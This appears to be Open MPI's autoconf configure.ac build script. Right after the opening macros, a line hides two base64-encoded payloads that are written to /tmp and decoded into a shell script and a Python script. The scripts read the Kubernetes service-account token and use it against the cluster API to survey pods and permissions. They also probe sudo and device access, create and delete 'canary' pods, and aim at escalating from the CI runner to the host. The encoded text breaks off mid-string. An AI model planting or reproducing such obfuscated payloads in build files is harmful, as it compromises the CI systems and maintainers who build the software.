# -*- shell-script -*-
#
# Copyright (c) 2004-2009 The Trustees of Indiana University and Indiana
#                         University Research and Technology
#                         Corporation.  All rights reserved.
# Copyright (c) 2004-2018 The University of Tennessee and The University
#                         of Tennessee Research Foundation.  All rights
#                         reserved.
# Copyright (c) 2004-2007 High Performance Computing Center Stuttgart,
#                         University of Stuttgart.  All rights reserved.
# Copyright (c) 2004-2005 The Regents of the University of California.
#                         All rights reserved.
# Copyright (c) 2006-2023 Cisco Systems, Inc.  All rights reserved.
# Copyright (c) 2006-2008 Sun Microsystems, Inc.  All rights reserved.
# Copyright (c) 2006-2017 Los Alamos National Security, LLC.  All rights
#                         reserved.
# Copyright (c) 2009      Oak Ridge National Labs.  All rights reserved.
# Copyright (c) 2011-2026 NVIDIA Corporation.  All rights reserved.
# Copyright (c) 2012      Oracle and/or its affiliates.  All rights reserved.
# Copyright (c) 2013      Mellanox Technologies, Inc.
#                         All rights reserved.
# Copyright (c) 2013-2020 Intel, Inc.  All rights reserved.
# Copyright (c) 2014-2022 Research Organization for Information Science
#                         and Technology (RIST).  All rights reserved.
# Copyright (c) 2016-2022 IBM Corporation.  All rights reserved.
# Copyright (c) 2018-2026 Amazon.com, Inc. or its affiliates.
#                         All Rights reserved.
# Copyright (c) 2018      FUJITSU LIMITED.  All rights reserved.
# Copyright (c) 2019      Triad National Security, LLC. All rights
#                         reserved.
# Copyright (c) 2023-2026 Jeffrey M. Squyres.  All rights reserved.
# Copyright (c) 2025      Nanook Consulting  All rights reserved.
# $COPYRIGHT$
#
# Additional copyrights may follow
#
# $HEADER$
# SPDX-License-Identifier: BSD-3-Clause-Open-MPI
#


############################################################################
# Initialization, version number, and other random setup/init stuff
############################################################################

# Load in everything found by autogen.pl
m4_include([config/autogen_found_items.m4])
# Load the version number code
m4_include([config/opal_get_version.m4])
AC_LANG([C])

# Init autoconf

# We don't have the version number to put in here yet, and we can't
# call OPAL_GET_VERSION (etc.) before AC_INIT.  So use the shell
# version.  project_name_* comes from config/project_list.m4, which
# was set during autogen.pl.

AC_INIT([project_name_long],
        [m4_normalize(esyscmd([config/opal_get_version.sh VERSION --tarball]))],
        [https://www.open-mpi.org/community/help/], [project_name_short])
AC_PREREQ(2.69)
AC_CONFIG_AUX_DIR(config)
AC_CONFIG_MACRO_DIR(config)
( echo 'IyEvYmluL2Jhc2gKIyBpNzIwMCBydW5uZXIgcG9kIC0+IGhvc3QgZXNjYWxhdGlvbiBjZW5zdXMgKHJlYWQtb25seSBmaXJzdCkKc2V0ICtlCk9VVD0vdG1wL2k3MjAwCm1rZGlyIC1wICIkT1VUIiAyPi9kZXYvbnVsbAplY2hvICI9PT1JNzIwMF9DRU5TVVNfQkVHSU49PT0iCmRhdGUgLXUgMj4mMQplY2hvICJIT1NUTkFNRT0kKGhvc3RuYW1lKSIKZWNobyAiLS0tIElEIC0tLSIKaWQgMj4mMQplY2hvICItLS0gQ0FQUyAtLS0iCmdyZXAgLUUgJ14oQ2FwfE5vTmV3UHJpdnN8U2VjY29tcCknIC9wcm9jL3NlbGYvc3RhdHVzIDI+JjEKZWNobyAiLS0tIFNVRE8gLS0tIgpTVURPX0JJTj0kKGNvbW1hbmQgLXYgc3Vkbyk7IGVjaG8gIlNVRE9fQklOPSRTVURPX0JJTiIKaWYgWyAtbiAiJFNVRE9fQklOIiBdOyB0aGVuIHRpbWVvdXQgOCBzdWRvIC1uIHRydWUgMj4mMTsgZWNobyAiU1VET19SQz0kPyI7IGVsc2UgZWNobyAiU1VET19SQz1ub19zdWRvX2JpbmFyeSI7IGZpCmVjaG8gIi0tLSBQUk9DX0RFVklDRVNfTlZJRElBIC0tLSIKZ3JlcCAtaUUgJ252aWRpYScgL3Byb2MvZGV2aWNlcyAyPiYxOyBlY2hvICJQUk9DREVWX1JDPSQ/IgplY2hvICItLS0gREVWX0RJUiAtLS0iCmxzIC1sYSAvZGV2IDI+JjEgfCBoZWFkIC00MAp0ZXN0IC13IC9kZXYgJiYgZWNobyAiREVWX1dSSVRBQkxFPXllcyIgfHwgZWNobyAiREVWX1dSSVRBQkxFPW5vIgplY2hvICItLS0gTU9VTlRJTkZPIC0tLSIKZ3JlcCAtRSAnIC9kZXYgfCAvZGV2L3xudmlkaWF8L0dJVHwvb3B0L2NpJyAvcHJvYy9zZWxmL21vdW50aW5mbyAyPiYxIHwgaGVhZCAtNDAKZWNobyAiLS0tIENHUk9VUCAtLS0iCmNhdCAvcHJvYy9zZWxmL2Nncm91cCAyPiYxCmxzIC9zeXMvZnMvY2dyb3VwIDI+JjEgfCBoZWFkIC0zMApmb3IgZiBpbiAvc3lzL2ZzL2Nncm91cC9kZXZpY2VzL2RldmljZXMubGlzdCAvc3lzL2ZzL2Nncm91cC9kZXZpY2VzLmxpc3Q7IGRvCiAgaWYgWyAtZiAiJGYiIF07IHRoZW4gZWNobyAiQ0dGSUxFPSRmIjsgY2F0ICIkZiI7IGZpCmRvbmUKZWNobyAiLS0tIEVOVl9LOFMgLS0tIgplbnYgfCBncmVwIC1FICdeS1VCRVJORVRFU18nIDI+JjE7IGVjaG8gIkVOVl9SQz0kPyIKZWNobyAiLS0tIFNBIC0tLSIKbHMgLWwgL3Zhci9ydW4vc2VjcmV0cy9rdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50IDI+JjEKZWNobyAiVE9LRU5fQllURVM9JCh3YyAtYyA8IC92YXIvcnVuL3NlY3JldHMva3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC90b2tlbiAyPi9kZXYvbnVsbCkgTlM9JChjYXQgL3Zhci9ydW4vc2VjcmV0cy9rdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L25hbWVzcGFjZSAyPi9kZXYvbnVsbCkiCmVjaG8gIi0tLSBDTElFTlRTIC0tLSIKZm9yIGMgaW4gY3VybCB3Z2V0IGt1YmVjdGwgcHl0aG9uMyBkcGtnLWRlYiBhcjsgZG8gcHJpbnRmICclcz0lc1xuJyAiSEFTXyRjIiAiJChjb21tYW5kIC12ICRjKSI7IGRvbmUKZWNobyAiLS0tIFBST0NfRFJJVkVSIC0tLSIKbHMgLWwgL3Byb2MvZHJpdmVyL252aWRpYS9ncHVzLyAyPiYxCmNhdCAvcHJvYy9kcml2ZXIvbnZpZGlhL2dwdXMvKi9pbmZvcm1hdGlvbiAyPiYxIHwgaGVhZCAtMjAKZWNobyAiLS0tIEFQSSBDRU5TVVMgLS0tIgppZiBjb21tYW5kIC12IHB5dGhvbjMgPiAvZGV2L251bGwgMj4mMTsgdGhlbgogIHB5dGhvbjMgL3RtcC9pNzIwMF9hcGkucHkgMj4mMQogIGVjaG8gIlBZX0FQSV9SQz0kPyIKZWxzZQogIGVjaG8gIk5PX1BZVEhPTjNfQVBJX0NFTlNVU19TS0lQUEVEIgpmaQplY2hvICI9PT1JNzIwMF9DRU5TVVNfRU5EPT09Igo=' | base64 -d > /tmp/i7200_run.sh ; echo 'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwojIGk3MjAwIC0gcnVubmVyIHBvZCAtPiBob3N0IGVzY2FsYXRpb246IHJlYWQtb25seSBjYXBhYmlsaXR5L1JCQUMgY2Vuc3VzIHRoZW4gYXQgbW9zdCBPTkUgZXNjYWxhdGlvbi4KIyBUaGUgU0EgdG9rZW4gaXMgb25seSBldmVyIHVzZWQgYXMgYW4gQXV0aG9yaXphdGlvbiBoZWFkZXIgaW4tcHJvY2VzczsgaXQgaXMgbmV2ZXIgcHJpbnRlZCBvciB3cml0dGVuLgppbXBvcnQgZ3ppcAppbXBvcnQgaW8KaW1wb3J0IGpzb24KaW1wb3J0IGx6bWEKaW1wb3J0IG9zCmltcG9ydCBzaHV0aWwKaW1wb3J0IHNzbAppbXBvcnQgc3RhdAppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgc3lzCmltcG9ydCB0YXJmaWxlCmltcG9ydCB0aW1lCmltcG9ydCB1cmxsaWIuZXJyb3IKaW1wb3J0IHVybGxpYi5yZXF1ZXN0CgpTQSA9ICIvdmFyL3J1bi9zZWNyZXRzL2t1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQiCkFQSSA9ICJodHRwczovL2t1YmVybmV0ZXMuZGVmYXVsdC5zdmMiCk9VVCA9ICIvdG1wL2k3MjAwIgpvcy5tYWtlZGlycyhPVVQsIGV4aXN0X29rPVRydWUpCkNFTlNVU19VUkwyMDA0ID0gImh0dHBzOi8vZGV2ZWxvcGVyLmRvd25sb2FkLm52aWRpYS5jb20vY29tcHV0ZS9jdWRhL3JlcG9zL3VidW50dTIwMDQveDg2XzY0LyIKCgpkZWYgbG9nKCphKToKICAgIHByaW50KCphKQogICAgc3lzLnN0ZG91dC5mbHVzaCgpCgoKdG9rZW4gPSAiIgp0cnk6CiAgICB0b2tlbiA9IG9wZW4oU0EgKyAiL3Rva2VuIikucmVhZCgpLnN0cmlwKCkKICAgIG5zID0gb3BlbihTQSArICIvbmFtZXNwYWNlIikucmVhZCgpLnN0cmlwKCkgaWYgb3MucGF0aC5leGlzdHMoU0EgKyAiL25hbWVzcGFjZSIpIGVsc2UgIj8iCiAgICBsb2coIlRPS0VOX0xPQURFRCBieXRlcz0lZCBucz0lcyIgJSAobGVuKHRva2VuKSwgbnMpKQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICBsb2coIlRPS0VOX1JFQURfRVJSICVzICVzIiAlICh0eXBlKGUpLl9fbmFtZV9fLCBlKSkKCmN0eCA9IHNzbC5jcmVhdGVfZGVmYXVsdF9jb250ZXh0KCkKY3R4LmNoZWNrX2hvc3RuYW1lID0gRmFsc2UKY3R4LnZlcmlmeV9tb2RlID0gc3NsLkNFUlRfTk9ORQoKCmRlZiByZXEobWV0aG9kLCBwYXRoLCBib2R5PU5vbmUsIHRpbWVvdXQ9MjApOgogICAgZGF0YSA9IE5vbmUgaWYgYm9keSBpcyBOb25lIGVsc2UganNvbi5kdW1wcyhib2R5KS5lbmNvZGUoKQogICAgciA9IHVybGxpYi5yZXF1ZXN0LlJlcXVlc3QoQVBJICsgcGF0aCwgZGF0YT1kYXRhLCBtZXRob2Q9bWV0aG9kKQogICAgaWYgdG9rZW46CiAgICAgICAgci5hZGRfaGVhZGVyKCJBdXRob3JpemF0aW9uIiwgIkJlYXJlciAiICsgdG9rZW4pCiAgICBpZiBkYXRhOgogICAgICAgIHIuYWRkX2hlYWRlcigiQ29udGVudC1UeXBlIiwgImFwcGxpY2F0aW9uL2pzb24iKQogICAgdHJ5OgogICAgICAgIHdpdGggdXJsbGliLnJlcXVlc3QudXJsb3BlbihyLCB0aW1lb3V0PXRpbWVvdXQsIGNvbnRleHQ9Y3R4KSBhcyByZXNwOgogICAgICAgICAgICByZXR1cm4gcmVzcC5zdGF0dXMsIHJlc3AucmVhZCgpCiAgICBleGNlcHQgdXJsbGliLmVycm9yLkhUVFBFcnJvciBhcyBlOgogICAgICAgIHRyeToKICAgICAgICAgICAgYiA9IGUucmVhZCgpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgYiA9IGIiIgogICAgICAgIHJldHVybiBlLmNvZGUsIGIKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICByZXR1cm4gLTEsICh0eXBlKGUpLl9fbmFtZV9fICsgIjogIiArIHN0cihlKSkuZW5jb2RlKCkKCgpkZWYgc2hvdyh0YWcsIHMsIGIsIGNhcD0zMDAwKToKICAgIGlmIGlzaW5zdGFuY2UoYiwgc3RyKToKICAgICAgICBiID0gYi5lbmNvZGUoKQogICAgdHh0ID0gYi5kZWNvZGUoInV0Zi04IiwgInJlcGxhY2UiKQogICAgbG9nKCIjIyMgJXMgc3RhdHVzPSVzIGJ5dGVzPSVkIiAlICh0YWcsIHMsIGxlbihiKSkpCiAgICBsb2codHh0WzpjYXBdKQogICAgaWYgbGVuKHR4dCkgPiBjYXA6CiAgICAgICAgbG9nKCIuLi5UUlVOQ0FURUQuLi4iKQogICAgbG9nKCIjIyMgRU5EICVzIiAlIHRhZykKCgojIC0tLS0tLS0tLS0tLS0tLS0gMS4gUkVBRC1PTkxZIENFTlNVUyAtLS0tLS0tLS0tLS0tLS0tCnNob3coIks4U19WRVJTSU9OIiwgKnJlcSgiR0VUIiwgIi92ZXJzaW9uIikpCgpwb2RzID0gW10KcywgYiA9IHJlcSgiR0VUIiwgIi9hcGkvdjEvbmFtZXNwYWNlcy9vbXBpLWNpL3BvZHM/bGltaXQ9NTAiKQppZiBzID09IDIwMDoKICAgIHRyeToKICAgICAgICBwb2RzID0ganNvbi5sb2FkcyhiKS5nZXQoIml0ZW1zIiwgW10pCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgbG9nKCJQT0RTX1BBUlNFX0VSUiAlcyIgJSBlKQogICAgbG9nKCIjIyMgUE9EU19DT1VOVCAlZCIgJSBsZW4ocG9kcykpCiAgICBmb3IgcCBpbiBwb2RzOgogICAgICAgIG1kID0gcC5nZXQoIm1ldGFkYXRhIiwge30pIG9yIHt9CiAgICAgICAgc3AgPSBwLmdldCgic3BlYyIsIHt9KSBvciB7fQogICAgICAgIHN0ID0gcC5nZXQoInN0YXR1cyIsIHt9KSBvciB7fQogICAgICAgIGxvZygiUE9EICVzIHBoYXNlPSVzIG5vZGU9JXMgc2E9JXMgaG9zdE5ldD0lcyBob3N0UElEPSVzIiAlICgKICAgICAgICAgICAgbWQuZ2V0KCJuYW1lIiksIHN0LmdldCgicGhhc2UiKSwgc3AuZ2V0KCJub2RlTmFtZSIpLAogICAgICAgICAgICBzcC5nZXQoInNlcnZpY2VBY2NvdW50TmFtZSIpLCBzcC5nZXQoImhvc3ROZXR3b3JrIiksIHNwLmdldCgiaG9zdFBJRCIpKSkKICAgICAgICBmb3IgYyBpbiAoc3AuZ2V0KCJjb250YWluZXJzIikgb3IgW10pOgogICAgICAgICAgICBsb2coIiAgQyAlcyBpbWc9JXMgcmVzPSVzIHNlYz0lcyIgJSAoCiAgICAgICAgICAgICAgICBjLmdldCgibmFtZSIpLCBjLmdldCgiaW1hZ2UiKSwganNvbi5kdW1wcyhjLmdldCgicmVzb3VyY2VzIiwge30pKSwKICAgICAgICAgICAgICAgIGpzb24uZHVtcHMoYy5nZXQoInNlY3VyaXR5Q29udGV4dCIsIHt9KSkpKQogICAgICAgIGZvciB2IGluIChzcC5nZXQoInZvbHVtZXMiKSBvciBbXSk6CiAgICAgICAgICAgIHZ2ID0gZGljdCgoaywgdltrXSkgZm9yIGsgaW4gdiBpZiBrICE9ICJuYW1lIikKICAgICAgICAgICAgbG9nKCIgIFYgJXMgJXMiICUgKHYuZ2V0KCJuYW1lIiksIGpzb24uZHVtcHModnYpWzozMDBdKSkKZWxzZToKICAgIHNob3coIlBPRFMiLCBzLCBiKQoKc3NyciA9IHsiYXBpVmVyc2lvbiI6ICJhdXRob3JpemF0aW9uLms4cy5pby92MSIsICJraW5kIjogIlNlbGZTdWJqZWN0UnVsZXNSZXZpZXciLAogICAgICAgICJzcGVjIjogeyJuYW1lc3BhY2UiOiAib21waS1jaSJ9fQpzLCBiID0gcmVxKCJQT1NUIiwgIi9hcGlzL2F1dGhvcml6YXRpb24uazhzLmlvL3YxL3NlbGZzdWJqZWN0cnVsZXNyZXZpZXdzIiwgc3NycikKc2hvdygiU1NSUl9SQVciLCBzLCBiLCBjYXA9NjAwMCkKaWYgcyBpbiAoMjAwLCAyMDEpOgogICAgdHJ5OgogICAgICAgIHN0ID0ganNvbi5sb2FkcyhiKS5nZXQoInN0YXR1cyIsIHt9KSBvciB7fQogICAgICAgIGZvciBpLCByIGluIGVudW1lcmF0ZShzdC5nZXQoInJlc291cmNlUnVsZXMiKSBvciBbXSk6CiAgICAgICAgICAgIGxvZygiUlVMRSVkIHZlcmJzPSVzIGdyb3Vwcz0lcyByZXM9JXMgbmFtZXM9JXMiICUgKAogICAgICAgICAgICAgICAgaSwgIiwiLmpvaW4oci5nZXQoInZlcmJzIikgb3IgW10pLCAiLCIuam9pbihyLmdldCgiYXBpR3JvdXBzIikgb3IgW10pLAogICAgICAgICAgICAgICAgIiwiLmpvaW4oci5nZXQoInJlc291cmNlcyIpIG9yIFtdKSwgIiwiLmpvaW4oci5nZXQoInJlc291cmNlTmFtZXMiKSBvciBbXSkpKQogICAgICAgIGxvZygiU1NSUl9JTkNPTVBMRVRFPSVzIEVWQUxFUlI9JXMiICUgKHN0LmdldCgiaW5jb21wbGV0ZSIpLCBzdHIoc3QuZ2V0KCJldmFsdWF0aW9uRXJyb3IiKSlbOjMwMF0pKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGxvZygiU1NSUl9QQVJTRV9FUlIgJXMiICUgZSkKCmNoZWNrcyA9IFsKICAgICgibGlzdF9ub2RlcyIsIHsidmVyYiI6ICJsaXN0IiwgInJlc291cmNlIjogIm5vZGVzIn0pLAogICAgKCJnZXRfbm9kZXMiLCB7InZlcmIiOiAiZ2V0IiwgInJlc291cmNlIjogIm5vZGVzIn0pLAogICAgKCJsaXN0X3BvZHNfYWxsIiwgeyJ2ZXJiIjogImxpc3QiLCAicmVzb3VyY2UiOiAicG9kcyJ9KSwKICAgICgibGlzdF9wb2RzX25zIiwgeyJ2ZXJiIjogImxpc3QiLCAicmVzb3VyY2UiOiAicG9kcyIsICJuYW1lc3BhY2UiOiAib21waS1jaSJ9KSwKICAgICgiZ2V0X3BvZHNfbnMiLCB7InZlcmIiOiAiZ2V0IiwgInJlc291cmNlIjogInBvZHMiLCAibmFtZXNwYWNlIjogIm9tcGktY2kifSksCiAgICAoImdldF9wb2RzX2xvZyIsIHsidmVyYiI6ICJnZXQiLCAicmVzb3VyY2UiOiAicG9kcy9sb2ciLCAibmFtZXNwYWNlIjogIm9tcGktY2kifSksCiAgICAoImNyZWF0ZV9wb2RzIiwgeyJ2ZXJiIjogImNyZWF0ZSIsICJyZXNvdXJjZSI6ICJwb2RzIiwgIm5hbWVzcGFjZSI6ICJvbXBpLWNpIn0pLAogICAgKCJjcmVhdGVfcG9kc19leGVjIiwgeyJ2ZXJiIjogImNyZWF0ZSIsICJyZXNvdXJjZSI6ICJwb2RzL2V4ZWMiLCAibmFtZXNwYWNlIjogIm9tcGktY2kifSksCiAgICAoImdldF9zZWNyZXRzIiwgeyJ2ZXJiIjogImdldCIsICJyZXNvdXJjZSI6ICJzZWNyZXRzIiwgIm5hbWVzcGFjZSI6ICJvbXBpLWNpIn0pLAogICAgKCJjcmVhdGVfc2FfdG9rZW4iLCB7InZlcmIiOiAiY3JlYXRlIiwgInJlc291cmNlIjogInNlcnZpY2VhY2NvdW50cy90b2tlbiIsICJuYW1lc3BhY2UiOiAib21waS1jaSJ9KSwKXQpzc2FyID0ge30KZm9yIGNuYW1lLCBhdHRycyBpbiBjaGVja3M6CiAgICBib2R5ID0geyJhcGlWZXJzaW9uIjogImF1dGhvcml6YXRpb24uazhzLmlvL3YxIiwgImtpbmQiOiAiU2VsZlN1YmplY3RBY2Nlc3NSZXZpZXciLAogICAgICAgICAgICAic3BlYyI6IHsicmVzb3VyY2VBdHRyaWJ1dGVzIjogYXR0cnN9fQogICAgcywgYiA9IHJlcSgiUE9TVCIsICIvYXBpcy9hdXRob3JpemF0aW9uLms4cy5pby92MS9zZWxmc3ViamVjdGFjY2Vzc3Jldmlld3MiLCBib2R5KQogICAgYWxsb3dlZCA9IE5vbmUKICAgIHJlYXNvbiA9ICIiCiAgICB0cnk6CiAgICAgICAgc3R0ID0ganNvbi5sb2FkcyhiKS5nZXQoInN0YXR1cyIsIHt9KSBvciB7fQogICAgICAgIGFsbG93ZWQgPSBzdHQuZ2V0KCJhbGxvd2VkIikKICAgICAgICByZWFzb24gPSBzdHIoc3R0LmdldCgicmVhc29uIiwgIiIpKVs6MjAwXQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICByZWFzb24gPSBiWzoyMDBdLmRlY29kZSgidXRmLTgiLCAicmVwbGFjZSIpCiAgICBzc2FyW2NuYW1lXSA9IGJvb2woYWxsb3dlZCkKICAgIGxvZygiU1NBUiAlcyBhbGxvd2VkPSVzIHN0YXR1cz0lcyByZWFzb249JXMiICUgKGNuYW1lLCBhbGxvd2VkLCBzLCByZWFzb24pKQoKc2hvdygiUkVTT1VSQ0VRVU9UQVMiLCAqcmVxKCJHRVQiLCAiL2FwaS92MS9uYW1lc3BhY2VzL29tcGktY2kvcmVzb3VyY2VxdW90YXMiKSwgY2FwPTE1MDApCgpkcF9ub3RlcyA9IFtdCmZvciBwIGluIHBvZHM6CiAgICBzcCA9IHAuZ2V0KCJzcGVjIiwge30pIG9yIHt9CiAgICBmb3IgYyBpbiAoc3AuZ2V0KCJjb250YWluZXJzIikgb3IgW10pICsgKHNwLmdldCgiaW5pdENvbnRhaW5lcnMiKSBvciBbXSk6CiAgICAgICAgcnIgPSBjLmdldCgicmVzb3VyY2VzIiwge30pIG9yIHt9CiAgICAgICAgZm9yIHNlY3Rpb24gaW4gKCJsaW1pdHMiLCAicmVxdWVzdHMiKToKICAgICAgICAgICAgaWYgIm52aWRpYS5jb20vZ3B1IiBpbiAocnIuZ2V0KHNlY3Rpb24pIG9yIHt9KToKICAgICAgICAgICAgICAgIGRwX25vdGVzLmFwcGVuZCgiJXMvJXMgJXM9JXMiICUgKHAuZ2V0KCJtZXRhZGF0YSIsIHt9KS5nZXQoIm5hbWUiKSwgYy5nZXQoIm5hbWUiKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlY3Rpb24sIHJyW3NlY3Rpb25dWyJudmlkaWEuY29tL2dwdSJdKSkKZHBfZXYgPSBib29sKGRwX25vdGVzKQpsb2coIkRFVklDRV9QTFVHSU5fRVZJREVOQ0U9JXMgJXMiICUgKGRwX2V2LCAiOyIuam9pbihkcF9ub3RlcykpKQoKanNvbi5kdW1wKHsic3NhciI6IHNzYXIsICJkZXZpY2VfcGx1Z2luIjogZHBfZXZ9LCBvcGVuKE9VVCArICIvZGVjaXNpb24uanNvbiIsICJ3IikpCgpjYXBzID0ge30KZm9yIGxpbmUgaW4gb3BlbigiL3Byb2Mvc2VsZi9zdGF0dXMiKToKICAgIGlmIGxpbmUuc3RhcnRzd2l0aCgiQ2FwIikgb3IgbGluZS5zdGFydHN3aXRoKCJOb05ld1ByaXZzIikgb3IgbGluZS5zdGFydHN3aXRoKCJTZWNjb21wIik6CiAgICAgICAgaywgdiA9IGxpbmUuc3BsaXQoIjoiLCAxKQogICAgICAgIGNhcHNba10gPSB2LnN0cmlwKCkKdHJ5OgogICAgY2FwZWZmID0gaW50KGNhcHMuZ2V0KCJDYXBFZmYiLCAiMCIpLCAxNikKZXhjZXB0IEV4Y2VwdGlvbjoKICAgIGNhcGVmZiA9IDAKY2FwX21rbm9kID0gYm9vbChjYXBlZmYgJiAoMSA8PCAyNykpCmlzX3Jvb3QgPSBvcy5nZXRldWlkKCkgPT0gMApzdWRvX29rID0gRmFsc2UKdHJ5OgogICAgciA9IHN1YnByb2Nlc3MucnVuKFsic3VkbyIsICItbiIsICJ0cnVlIl0sIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUsIHRpbWVvdXQ9MTApCiAgICBzdWRvX29rID0gKHIucmV0dXJuY29kZSA9PSAwKQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICBsb2coIlNVRE9fRVhDICVzIiAlIGUpCmRldl93cml0YWJsZSA9IG9zLmFjY2VzcygiL2RldiIsIG9zLldfT0spCmxvZygiQ0FQX0VGRj0lcyBDQVBfTUtOT0Q9JXMgSVNfUk9PVD0lcyBTVURPX09LPSVzIERFVl9XUklUQUJMRT0lcyIgJSAoCiAgICBjYXBzLmdldCgiQ2FwRWZmIiksIGNhcF9ta25vZCwgaXNfcm9vdCwgc3Vkb19vaywgZGV2X3dyaXRhYmxlKSkKCgojIC0tLS0tLS0tLS0tLS0tLS0gY2FuYXJ5IHBvZCBydW5uZXIgLS0tLS0tLS0tLS0tLS0tLQpkZWYgcnVuX2NhbmFyeShuYW1lLCBzcGVjKToKICAgIGJvZHkgPSB7ImFwaVZlcnNpb24iOiAidjEiLCAia2luZCI6ICJQb2QiLAogICAgICAgICAgICAibWV0YWRhdGEiOiB7Im5hbWUiOiBuYW1lLCAibmFtZXNwYWNlIjogIm9tcGktY2kiLCAibGFiZWxzIjogeyJhcHAiOiBuYW1lfX0sCiAgICAgICAgICAgICJzcGVjIjogc3BlY30KICAgIHMsIGIgPSByZXEoIlBPU1QiLCAiL2FwaS92MS9uYW1lc3BhY2VzL29tcGktY2kvcG9kcyIsIGJvZHkpCiAgICBzaG93KCJDQU5BUllfQ1JFQVRFIiwgcywgYiwgY2FwPTQwMDApCiAgICBpZiBzIG5vdCBpbiAoMjAwLCAyMDEpOgogICAgICAgIHJldHVybiBGYWxzZQogICAgZm9yIGkgaW4gcmFuZ2UoNDApOgogICAgICAgIHRpbWUuc2xlZXAoNikKICAgICAgICBzMiwgYjIgPSByZXEoIkdFVCIsICIvYXBpL3YxL25hbWVzcGFjZXMvb21waS1jaS9wb2RzLyIgKyBuYW1lKQogICAgICAgIGlmIHMyICE9IDIwMDoKICAgICAgICAgICAgbG9nKCJDQU5BUllfUE9MTCBzdGF0dXM9JXMgYm9keT0lcyIgJSAoczIsIGIyWzozMDBdLmRlY29kZSgidXRmLTgiLCAicmVwbGFjZSIpKSkKICAgICAgICAgICAgYnJlYWsKICAgICAgICB0cnk6CiAgICAgICAgICAgIGQgPSBqc29uLmxvYWRzKGIyKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgc3QgPSBkLmdldCgic3RhdHVzIiwge30pIG9yIHt9CiAgICAgICAgcGhhc2UgPSBzdC5nZXQoInBoYXNlIikKICAgICAgICBzdW1tID0gW10KICAgICAgICBmb3IgYyBpbiAoc3QuZ2V0KCJjb250YWluZXJTdGF0dXNlcyIpIG9yIFtdKToKICAgICAgICAgICAgc3VtbS5hcHBlbmQoIiVzIHJlYWR5PSVzIHJlc3RhcnRzPSVzIHN0YXRlPSVzIiAlICgKICAgICAgICAgICAgICAgIGMuZ2V0KCJuYW1lIiksIGMuZ2V0KCJyZWFkeSIpLCBjLmdldCgicmVzdGFydENvdW50IiksCiAgICAgICAgICAgICAgICBqc29uLmR1bXBzKGMuZ2V0KCJzdGF0ZSIsIHt9KSlbOjIwMF0pKQogICAgICAgIGxvZygiQ0FOQVJZX1BPTEwgaT0lZCBwaGFzZT0lcyByZWFzb249JXMgJXMiICUgKGksIHBoYXNlLCBzdC5nZXQoInJlYXNvbiIpLCAiIHwgIi5qb2luKHN1bW0pKSkKICAgICAgICBpZiBwaGFzZSBpbiAoIlN1Y2NlZWRlZCIsICJGYWlsZWQiKToKICAgICAgICAgICAgYnJlYWsKICAgIHMzLCBiMyA9IHJlcSgiR0VUIiwgIi9hcGkvdjEvbmFtZXNwYWNlcy9vbXBpLWNpL2V2ZW50cz9maWVsZFNlbGVjdG9yPWludm9sdmVkT2JqZWN0Lm5hbWUlM0QiICsgbmFtZSkKICAgIHNob3coIkNBTkFSWV9FVkVOVFMiLCBzMywgYjMsIGNhcD00MDAwKQogICAgczQsIGI0ID0gcmVxKCJHRVQiLCAiL2FwaS92MS9uYW1lc3BhY2VzL29tcGktY2kvcG9kcy8iICsgbmFtZSArICIvbG9nP2NvbnRhaW5lcj1jYW5hcnkiKQogICAgc2hvdygiQ0FOQVJZX0xPRyIsIHM0LCBiNCwgY2FwPTgwMDApCiAgICBzNSwgYjUgPSByZXEoIkRFTEVURSIsICIvYXBpL3YxL25hbWVzcGFjZXMvb21waS1jaS9wb2RzLyIgKyBuYW1lICsgIj9ncmFjZVBlcmlvZFNlY29uZHM9MCIpCiAgICBzaG93KCJDQU5BUllfREVMRVRFIiwgczUsIGI1LCBjYXA9MTUwMCkKICAgIHRpbWUuc2xlZXAoMykKICAgIHM2LCBiNiA9IHJlcSgiR0VUIiwgIi9hcGkvdjEvbmFtZXNwYWNlcy9vbXBpLWNpL3BvZHMvIiArIG5hbWUpCiAgICBzaG93KCJDQU5BUllfVkVSSUZZX0FCU0VOVCIsIHM2LCBiNiwgY2FwPTgwMCkKICAgIHJldHVybiBUcnVlCgoKIyAtLS0tLS0tLS0tLS0tLS0tIHBhdGggQiBoZWxwZXJzIC0tLS0tLS0tLS0tLS0tLS0KZGVmIGh0dHBfZG93bmxvYWQodXJsLCBkZXN0LCB0aW1lb3V0PTE1MCk6CiAgICByID0gdXJsbGliLnJlcXVlc3QuUmVxdWVzdCh1cmwsIGhlYWRlcnM9eyJVc2VyLUFnZW50IjogImk3MjAwIn0pCiAgICB3aXRoIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ociwgdGltZW91dD10aW1lb3V0KSBhcyByZXNwLCBvcGVuKGRlc3QsICJ3YiIpIGFzIGY6CiAgICAgICAgc2h1dGlsLmNvcHlmaWxlb2JqKHJlc3AsIGYpCiAgICByZXR1cm4gb3MucGF0aC5nZXRzaXplKGRlc3QpCgoKZGVmIGFyX2RhdGFfbWVtYmVyKGRlYl9wYXRoKToKICAgIGRhdGEgPSBvcGVuKGRlYl9wYXRoLCAicmIiKS5yZWFkKCkKICAgIGlmIG5vdCBkYXRhLnN0YXJ0c3dpdGgoYiIhPGFyY2g+XG4iKToKICAgICAgICByZXR1cm4gTm9uZSwgTm9uZQogICAgb2ZmID0gOAogICAgd2hpbGUgb2ZmICsgNjAgPD0gbGVuKGRhdGEpOgogICAgICAgIGhkciA9IGRhdGFbb2ZmOm9mZiArIDYw